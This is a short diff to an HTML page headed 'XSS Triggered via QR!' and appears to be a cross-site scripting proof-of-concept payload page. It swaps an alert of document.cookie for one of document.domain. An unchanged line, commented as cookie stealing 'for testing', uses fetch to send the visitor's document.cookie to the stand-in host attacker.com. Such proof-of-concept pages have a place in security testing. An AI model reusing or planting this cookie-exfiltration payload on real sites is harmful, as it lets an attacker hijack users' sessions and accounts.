@@ -7,7 +7,7 @@
     <h1>XSS Triggered via QR!</h1>
     <script>
         // Basic XSS
-        alert(document.cookie);
+        alert(document.domain);
         
         // Cookie stealing (untuk testing)
         fetch('https://attacker.com/steal?cookie='+document.cookie);
